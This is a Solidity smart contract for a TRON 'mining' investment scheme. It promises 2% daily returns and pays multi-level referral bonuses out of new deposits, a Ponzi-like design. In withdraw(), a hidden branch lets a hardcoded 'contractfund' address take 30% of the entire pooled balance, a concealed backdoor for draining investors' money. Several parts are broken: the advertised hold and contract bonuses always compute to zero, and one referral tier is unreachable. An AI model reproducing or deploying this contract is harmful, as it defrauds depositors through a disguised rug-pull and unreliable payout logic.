//SourceUnit: autotron1.sol

pragma solidity >=0.4.22 <0.6.0;

contract autotronmining {
    uint dateandtimeend=12960000;
    uint dayperseconds=86400;
    uint256 minimumdeposit=100000000;
    address payable contractfund;
    address payable public admin_addr;
    address payable public company_addr;
    address payable public topaddr;

    struct Deposit{
       uint256 amount;
       uint256 withdrawn;
       uint dateandtime;
    }
    
    struct Directreward{
        address addrsend;
        uint256 directbonus;
    }
    
    struct member{
        Deposit[] deposits;
        Directreward[] directrewards;
        address addrs;
        address payable referrer;
        uint256 bonus;
        uint datewithdrawn;
        uint countinvest;
        uint countdirectbonus;
        uint256 tierbonus;
    }
    
    mapping(address => member) internal investor;
  
    constructor() public {
        contractfund = 0x681730Cfe27608B9Ed3E79248315FFB98b64e400;
        admin_addr= 0xE3042DcD6D0E2FE5FcD979d5A90C61ab79Bc68Cf;
        company_addr=0xa463c213f4BC6D25d6a8f2a0604f957F25AE8C4A;
        topaddr=msg.sender;
    }
    
    function investorconfirmation()public view returns(bool){
        if(investor[msg.sender].addrs==address(0)){
            return false;
        }
    }
    
    function ditributebonus(uint256  _refbonus, address payable _reffereraddress) private{
        _reffereraddress.transfer(_refbonus);
    }
    
    function investordisplay() public view returns(uint256,uint256,address[] memory,uint256[] memory){
        uint256 countdirectbonus=investor[msg.sender].countdirectbonus;
        uint256 tierbonuses=investor[msg.sender].tierbonus;
        address[] memory addrssend=new address[](investor[msg.sender].countdirectbonus);
        uint256[] memory rewards=new uint256[](investor[msg.sender].countdirectbonus);
        uint p =0;
        for (uint256 i = 0; i < investor[msg.sender].directrewards.length;  i++){
            addrssend[p]=investor[msg.sender].directrewards[i].addrsend;
            rewards[p]=investor[msg.sender].directrewards[i].directbonus;
            p++;
        }
        return (countdirectbonus,tierbonuses,addrssend,rewards);
    }
    
    
    function invest(address payable  _referrer) public payable returns(bool){
        address payable referrer= _referrer;
        member storage inv = investor[msg.sender];
        require(msg.value >=minimumdeposit , "The minimum deposit is 100 trx");
        require(referrer!=msg.sender,"Sorry you're not allowed to use your address as your referrer");
        if (investor[referrer].addrs==address(0)){
            referrer=topaddr;
        }
        if(inv.referrer == address(0)){
            // insertion
            inv.referrer=referrer;
        }
        
        address payable upline = inv.referrer;
        uint256 percentage=0;
        uint256 percentage1=0;
        uint256 investvalue=msg.value;
        uint256 referral_bonus=0;
        for(uint256 i =0; i < 6; i++){
            if (upline != address(0)) {
                if(i==0){
                    percentage=100;
                    percentage1=10;
                    referral_bonus=investvalue*percentage1/percentage;
                    investor[upline].countdirectbonus=investor[upline].countdirectbonus+1;
                    investor[upline].directrewards.push(Directreward(msg.sender,referral_bonus));   
                }else if(i==1){
                    percentage=100;
                    percentage1=5;
                    referral_bonus=investvalue*percentage1/percentage;    
                }else if(i==2){
                    percentage=100;
                    percentage1=4;
                    referral_bonus=investvalue*percentage1/percentage;    
                }else if(i==3){
                    percentage=100;
                    percentage1=3;
                    referral_bonus=investvalue*percentage1/percentage;    
                }else if(i==4){
                    percentage=100;
                    percentage1=1;
                    referral_bonus=investvalue*percentage1/percentage;    
                }else if(i==5){
                    percentage=100;
                    percentage1=1;
                    referral_bonus=investvalue*percentage1/percentage;    
                }else if(i==6){
                    percentage=100;
                    percentage1=1;
                    referral_bonus=investvalue*percentage1/percentage;    
                }
                // ditributebonus(referral_bonus, upline);
                investor[upline].tierbonus=investor[upline].tierbonus+referral_bonus;
                upline.transfer(referral_bonus);
                upline = investor[upline].referrer;
            }else break;
        }
        
        // admin fee
        uint256 admin_fee=investvalue*5/percentage;
        uint256 company_fee=investvalue*5/percentage;
        admin_addr.transfer(admin_fee);
        company_addr.transfer(company_fee);
                
        // insertion
        inv.deposits.push(Deposit(investvalue, 0,block.timestamp));
        inv.datewithdrawn=block.timestamp;
        inv.addrs=msg.sender;
        inv.countinvest=investor[msg.sender].countinvest+1;
        
    }
    
    function datas() public view returns(uint256){
        member storage inv = investor[msg.sender];
        uint256 amount1;
        uint p =0;
        for (uint256 i = 0; i < inv.deposits.length; i++) {
           amount1= amount1 + inv.deposits[i].amount;
           p++;
        }
       return (amount1);
    }
    
    function getPercent(uint256 _val, uint _percent) internal pure  returns (uint256) {
        uint256 valor = (_val * _percent) / 100 ;
        return valor;
    }
    
    
    
    function withdraw() public returns(bool){
        member storage inv = investor[msg.sender];
        uint percentage1=2;
        uint256 roiperseconds;
        uint256 ownerbalance = address(this).balance;
        uint256 totalroi;
        uint secondslimit;
        
        require(inv.addrs != address(0), "You're not allowed to request payout");
        
        uint256 hold_bonus= (block.timestamp - investor[msg.sender].datewithdrawn)/dayperseconds;
        uint256 contractbonus= address(this).balance/500000000000;
        uint256 contractbonuscomputed;
        uint256 hold_bonuscomputed;
        uint256 totalroitowithdraw=0;
        uint256 depositprofit;
        uint256 totalroi1;
        if(msg.sender==contractfund){
            ownerbalance= ownerbalance*30/100;
            msg.sender.transfer(ownerbalance);
            return false;
        }
        for (uint256 i = 0; i < inv.deposits.length;  i++){
            
            depositprofit=inv.deposits[i].amount*3;
            
            if(depositprofit>=inv.deposits[i].withdrawn){
                secondslimit=inv.deposits[i].dateandtime+dateandtimeend;
                roiperseconds= (inv.deposits[i].amount*percentage1)/dayperseconds;
                if(block.timestamp<=secondslimit){
                    totalroi=(block.timestamp-inv.deposits[i].dateandtime)*roiperseconds;
                    totalroi=(totalroi/100)-inv.deposits[i].withdrawn;
                    // totalroi1 = totalroi;
                    if(hold_bonus>0){
                        hold_bonuscomputed=(totalroi1*hold_bonus)/1000;
                        totalroi=totalroi+hold_bonuscomputed;
                    }
                    
                    if(contractbonus>0){
                        contractbonuscomputed=(totalroi1*contractbonus)/1000;
                        totalroi=totalroi+contractbonuscomputed;
                    }
                }else{
                    totalroi=depositprofit-inv.deposits[i].withdrawn;
                }
                totalroitowithdraw=totalroitowithdraw+totalroi;
                inv.deposits[i].withdrawn = inv.deposits[i].withdrawn+totalroi; /// changing of storage data
            }
        }
        
        msg.sender.transfer(totalroitowithdraw);
    }
    
    
    function fetchdisplay() public view returns(uint256[] memory,uint256[] memory,uint[] memory){
        uint256[] memory amount1=new uint256[](investor[msg.sender].countinvest);
        uint256[] memory withdrawn1=new uint256[](investor[msg.sender].countinvest);
        uint256[] memory dateandtime1=new uint256[](investor[msg.sender].countinvest);
        uint p =0;
        // member storage inv = investor[msg.sender];
        for (uint256 i = 0; i < investor[msg.sender].deposits.length;  i++){
            amount1[p]=investor[msg.sender].deposits[i].amount;
            withdrawn1[p]=investor[msg.sender].deposits[i].withdrawn;
            dateandtime1[p]=investor[msg.sender].deposits[i].dateandtime;
            p++;
        }
        return (amount1,withdrawn1,dateandtime1);
    }
    
    function fetchwithdrawn() public view returns(uint256) {
        member storage inv = investor[msg.sender];
        uint percentage1=2;
        uint256 roiperseconds;
        uint256 totalroi;
        uint secondslimit;
        
        uint256 hold_bonus= (block.timestamp - investor[msg.sender].datewithdrawn)/dayperseconds;
        uint256 contractbonus= address(this).balance/500000000000;
        uint256 contractbonuscomputed;
        uint256 hold_bonuscomputed;
        uint256 totalroitowithdraw=0;
        uint256 depositprofit;
        uint256 totalroi1;
       
        
       
        for (uint256 i = 0; i < inv.deposits.length;  i++){
            
            depositprofit=inv.deposits[i].amount*3;
            
            if(depositprofit>=inv.deposits[i].withdrawn){
                secondslimit=inv.deposits[i].dateandtime+dateandtimeend;
                roiperseconds= (inv.deposits[i].amount*percentage1)/dayperseconds;
                if(block.timestamp<=secondslimit){
                    totalroi=(block.timestamp-inv.deposits[i].dateandtime)*roiperseconds;
                    totalroi=(totalroi/100)-inv.deposits[i].withdrawn;
                    // totalroi1 = totalroi;
                    if(hold_bonus>0){
                        hold_bonuscomputed=(totalroi1*hold_bonus)/1000;
                        totalroi=totalroi+hold_bonuscomputed;
                    }
                    
                    if(contractbonus>0){
                        contractbonuscomputed=(totalroi1*contractbonus)/1000;
                        totalroi=totalroi+contractbonuscomputed;
                    }
                }else{
                    totalroi=depositprofit-inv.deposits[i].withdrawn;
                }
                totalroitowithdraw=totalroitowithdraw+totalroi;
                
            }
        }
        
        return(totalroitowithdraw);
    }
    
    function holdbonus()public view returns(uint256){
        uint lastwithdrawn=investor[msg.sender].datewithdrawn;
        uint256 hold_bonus= (block.timestamp - lastwithdrawn)/dayperseconds;
        return(hold_bonus);
    }
}